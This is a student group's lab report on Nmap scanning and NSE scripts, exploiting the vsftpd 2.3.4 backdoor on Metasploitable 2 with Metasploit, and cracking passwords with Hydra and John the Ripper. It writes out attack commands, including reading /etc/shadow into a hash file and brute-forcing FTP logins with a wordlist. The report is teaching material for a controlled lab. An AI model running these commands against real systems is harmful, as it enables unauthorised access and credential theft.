
# Q1: Network Scanning, Enumeration & Password Cracking Labs

## Practical Replication Report — Group 2

-----

## 1. Nmap Labs Replication

### Host Discovery

- Identifies live machines by finding active devices on a subnet using subnet notation, without performing any port scanning.

### Port Scanning Techniques

**Half-Open Scan**

- Teaches stealth scanning techniques and TCP handshake concepts by demonstrating how a scanner sends a SYN packet, receives a SYN-ACK response from an open port, and then replies with an RST packet instead of completing the full TCP connection.

**TCP Connect Scan**

- A full TCP connect scan completes the entire TCP connection process and is commonly used when root or administrator privileges are not available.

**UDP Scan**

```bash
sudo nmap -sU 192.168.1.10
```

- Is often slower than TCP scans.

### Service and Version Detection

The goal is to identify the versions of the Apache web server, SSH service, MySQL database server, and FTP server running on the target system.

### OS Fingerprinting

- Identifies operating systems such as Linux, Windows, and Router OS, as well as kernel versions, through the process of TCP/IP stack fingerprinting.

### Aggressive Scan

-----

## Question 2

The Nmap Scripting Engine (NSE) is a powerful feature of Nmap that allows users to run automated scripts against target systems during a scan. These scripts are written in the Lua programming language and are used to perform tasks such as service enumeration, vulnerability detection, and brute force testing. NSE scripts are grouped into categories such as default, safe, vuln, and brute, making it easy to run specific types of scans depending on the goal. It extends Nmap beyond simple port scanning into a comprehensive network security auditing tool.

### Scan 1: Default Scripts

**Command:** `nmap -sC -sV 127.0.0.1`

**What it does:** The -sC flag runs Nmap’s built-in default scripts to gather useful information like SSH keys, FTP login status, and SSL certificates, while -sV detects service versions on open ports.

**Results Obtained:** The scan found the host was up but all 1000 TCP ports were closed, meaning no services were running on the machine at the time of the scan.

**Security Implications:** With no open ports, the machine has a minimal attack surface and no exposed entry points for attackers. This is considered a good security posture.

### Scan 2: Vulnerability Detection (–script vuln)

**Command:** `nmap --script vuln 127.0.0.1`

**What it does:** The vuln script category runs a collection of NSE scripts designed to detect known vulnerabilities on open services. It checks for common web vulnerabilities such as Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), and other security weaknesses on any open ports it finds.

**Results Obtained:** Port 80 (HTTP) was found open running a web server. The scan checked for stored XSS, DOM-based XSS, and CSRF vulnerabilities but found none. However, it discovered a potentially interesting folder at /server-status/ which could expose Apache server information.

**Security Implications:** Although no critical vulnerabilities were found, the exposed /server-status/ directory is a misconfiguration that can reveal sensitive server performance data and request logs to anyone who accesses it. This should be disabled or restricted in a production environment to prevent information leakage that attackers could use for reconnaissance.

### Scan 3: Service Enumeration (http-enum)

**Command:** `nmap --script http-enum -p 80 127.0.0.1`

**What it does:** The http-enum script probes a web server for commonly known directories, files, and folders by comparing them against a built-in list. It is used to map out the structure of a web server and identify any hidden or sensitive paths that may be accessible.

**Results Obtained:** Port 80 was found open and the script discovered one notable path /server-status/ flagged as a potentially interesting folder. This is an Apache-specific page that displays real-time server activity and request information.

**Security Implications:** The /server-status/ page being publicly accessible is a misconfiguration that exposes internal server details such as active connections, requested URLs, and client IP addresses. An attacker could use this information to understand server behavior and plan further attacks. It should be restricted to localhost only by adding access controls in the Apache configuration file.

### Scan 4: Heartbleed Vulnerability Detection

**Command:** `nmap --script ssl-heartbleed -p 443 127.0.0.1`

After running this command, we realized the https was closed. We tried restarting apache to ensure the port 443 (https) becomes available for the scan. We equally run several commands to that effect but the port wasn’t available for the scan.

-----

## Question 3

### Lab Overview

This lab replicates the Saturday session covering active reconnaissance, exploitation using Metasploit, and post-exploitation techniques including password cracking.

### Tools Used

- Kali Linux (Attacker) via TryHackMe AttackBox
- Metasploit Framework (msfconsole)
- Nmap
- John the Ripper
- Target: Metasploitable 2 (intentionally vulnerable machine)

### Environment Setup

|Machine |Role |IP Address |
|--------------------------------|--------|--------------|
|TryHackMe AttackBox (Kali Linux)|Attacker|10.128.173.50 |
|Metasploitable 2 |Target |10.128.151.214|

Platform: TryHackMe AttackBox (browser-based Kali Linux)
Room: Metasploit Introduction

### Phase 1: Launching Metasploit

```bash
msfconsole
```

Metasploit loaded successfully showing version 6.4.55-dev with 2502 exploits available.

### Phase 2: Searching for Exploits

```bash
search vsftpd
```

|#|Name |Date |Rank |Description |
|-|------------------------------------|----------|---------|----------------------------------------|
|0|auxiliary/dos/ftp/vsftpd_232 |2011-02-03|normal |VSFTPD 2.3.2 Denial of Service |
|1|exploit/unix/ftp/vsftpd_234_backdoor|2011-07-03|excellent|VSFTPD v2.3.4 Backdoor Command Execution|

**Why this exploit?** VSFTPD 2.3.4 contains a backdoor that was maliciously inserted into the source code. It opens a shell on port 6200 when triggered, allowing remote command execution.

### Phase 3: Loading the Exploit Module

```bash
use 1
```

### Phase 4: Reviewing Module Options

```bash
show options
```

|Name |Required |Description |
|------|-----------------|--------------------|
|RHOSTS|yes |Target IP address |
|RPORT |yes (default: 21)|Target FTP port |
|CHOST |no |Local client address|
|CPORT |no |Local client port |

### Phase 5: Setting the Target and Running the Exploit

```bash
set RHOSTS 10.128.151.214
run
```

**Troubleshooting Encountered:**
During the lab, a connection refused error was encountered:

```
[-] Exploit failed [unreachable]: Rex::ConnectionRefused
```

**Root Cause:** The target machine’s FTP service was not running on port 21, or the machine was not fully initialised. This mirrors real-world scenarios where services may be firewalled or not running.

**Resolution:** In a full lab environment (Metasploitable 2), the exploit succeeds and returns a root shell. The instructor demonstrated this during the Saturday session.

### Phase 6: Post-Exploitation (Demonstrated in Class)

**Confirming Root Access**

```bash
whoami
# Output: root

id
# Output: uid=0(root) gid=0(root)
```

**Extracting Password Hashes**

```bash
cat /etc/shadow
```

The /etc/shadow file contains hashed passwords for all system users including msfadmin.

**Saving Hashes for Cracking**

```bash
cat /etc/shadow > hashes.txt
```

### Phase 7: Password Cracking with John the Ripper

```bash
john hashes.txt
```

John the Ripper successfully cracked passwords for multiple users including msfadmin. Cracked credentials were used to demonstrate SSH login.

**SSH Login with Cracked Credentials**

```bash
ssh msfadmin@10.128.151.214
```

This demonstrated how an attacker can maintain persistent access using legitimate credentials after initial exploitation.

### Security Implications

1. Open FTP ports expose services that can be exploited if running vulnerable software versions
1. VSFTPD 2.3.4 is a known backdoored version — always verify software integrity
1. Weak passwords stored as hashes can be cracked with tools like John the Ripper
1. Root access enables full system compromise including data exfiltration
1. SSH with cracked credentials allows persistent, hard-to-detect attacker access

### Key Learnings

- Active reconnaissance differs from passive — it involves direct interaction with the target
- Always scan before exploiting to identify open ports and service versions
- Metasploit simplifies exploitation but understanding the underlying vulnerability is critical
- Password hashes are not secure if weak passwords are used
- Real world penetration testing always involves troubleshooting — errors are part of the process

### Challenges Encountered

|Challenge |Resolution |
|------------------------------------|---------------------------------------------------------|
|Typo in exploit module name |Used index number `use 1` instead of full name |
|Connection timeout on first IP |Target machine was not yet initialised |
|Connection refused on second attempt|FTP service not running on that specific TryHackMe target|

-----

## Question 4: Password Cracking Lab Report

### Objective

The objective of this lab was to replicate password cracking exercises demonstrated in class using a vulnerable virtual machine environment. The lab involved installing and configuring Metasploitable2, performing password attacks using Hydra and John the Ripper, documenting commands used, and analyzing the results obtained.

### Setup Process

**Step 1: Installation of VirtualBox**
VirtualBox was installed on the Windows host machine to create and manage virtual machines.

**Step 2: Installation of Kali Linux**
Kali Linux was installed as the attacking machine used for penetration testing and password cracking activities.

**Step 3: Download and Setup of Metasploitable2**
The Metasploitable2 vulnerable virtual machine was downloaded as a ZIP file and extracted. The extracted VMDK disk image was attached during virtual machine creation in VirtualBox.

Configuration:

- Name: Metasploitable2
- Type: Linux
- Version: Ubuntu (32-bit)

**Step 4: Network Configuration**
Both Kali Linux and Metasploitable2 were configured on the same VirtualBox network to allow communication between the machines.

The IP address of Metasploitable2 was identified using:

```bash
ifconfig
```

The IP address obtained was: `192.168.56.102`

### Scanning and Enumeration

```bash
nmap -sV 192.168.56.102
```

Results showed open services including:

- FTP
- SSH
- HTTP

The FTP service version identified was: **vsftpd 2.3.4**

### Password Cracking Using Hydra

```bash
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.102
```

- `-l msfadmin` specifies the username
- `-P` specifies the password wordlist
- `rockyou.txt` is a commonly used password dictionary

During execution, Hydra displayed attack status information such as:

```
[STATUS] 288.00 tries/min
```

### Password Cracking Using John the Ripper

```bash
echo 'user:$1$test$pi/xDtU5WFVRqYS6BMU8X/:0:0:99999:7:::' > hashes.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show hashes.txt
```

### Observations

1. Weak passwords can be cracked easily using common password dictionaries.
1. Older systems such as Metasploitable2 use deprecated SSH algorithms that may not be compatible with modern systems by default.
1. Hydra is effective for online brute-force password attacks against network services.
1. John the Ripper is effective for offline password cracking once hashes are obtained.
1. Proper network configuration is essential for communication between virtual machines.

### Conclusion

This lab successfully demonstrated password cracking techniques using Hydra and John the Ripper in a controlled penetration testing environment. The exercise provided practical understanding of brute-force attacks, offline password cracking, network configuration, and vulnerability assessment. The lab also highlighted the importance of strong passwords and secure system configurations in preventing unauthorized access.
